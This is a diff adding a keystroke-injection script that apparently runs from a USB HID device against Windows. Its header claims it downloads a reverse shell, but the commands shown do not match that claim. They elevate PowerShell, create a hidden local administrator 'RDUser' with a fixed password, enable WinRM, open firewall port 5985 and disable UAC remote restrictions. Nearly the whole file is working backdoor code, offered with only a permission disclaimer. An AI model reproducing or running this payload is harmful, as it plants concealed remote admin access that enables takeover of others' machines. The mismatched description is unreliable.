@@ -1,0 +1,65 @@
+REM ------------------------------------
+REM Description: Downloads a reverse shell script and runs it
+REM Author: P-ict0 (https://github.com/P-ict0)
+REM Inspiration: https://github.com/TW-D
+REM Date: 21/01/2025
+REM THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE, I TAKE NO RESPONSIBILITIES FOR ANY MISUSE
+REM ------------------------------------
+REM This script:
+REM 1. Creates a new user RDUser:RDPassword123!
+REM 2. Adds this local user to local administrator group.
+REM 3. Enables "Windows Remote Management" with default settings.
+REM 4. Adds a rule to the firewall.
+REM 5. Sets a value to "LocalAccountTokenFilterPolicy" to disable "UAC" remote restrictions.
+REM 6. Hides this user account.
+REM ------------------------------------
+
+DELAY 1000
+
+REM ---------- Minimize everything ----------
+GUI m
+DELAY 200
+
+REM ---------- Open PowerShell as Admin ----------
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process PowerShell -Verb RunAs"
+ENTER
+DELAY 2000
+LEFTARROW
+ENTER
+DELAY 1500
+
+REM ---------- Create a new user ----------
+STRING New-LocalUser -Name "RDUser" -Password (ConvertTo-SecureString "RDPassword123!" -AsPlainText -Force) -UserMayChangePassword $false -PasswordNeverExpires $true
+ENTER
+DELAY 1000
+
+REM ---------- Add user to local administrator group ----------
+STRING net localgroup administrators RDUser /add
+ENTER
+DELAY 1000
+
+REM ---------- Enable Windows Remote Management ----------
+STRING Enable-PSRemoting -Force
+ENTER
+DELAY 1000
+
+REM ---------- Add a rule to the firewall ----------
+STRING New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -Profile Any
+ENTER
+DELAY 1000
+
+REM ---------- Set LocalAccountTokenFilterPolicy ----------
+STRING Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Type DWord -Force
+ENTER
+DELAY 1000
+
+REM ---------- Hide the user account from login screen ----------
+STRING Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "RDUser" -Value 0 -Type DWord -Force
+ENTER
+DELAY 1000
+
+REM ---------- Close PowerShell ----------
+STRING exit
+ENTER
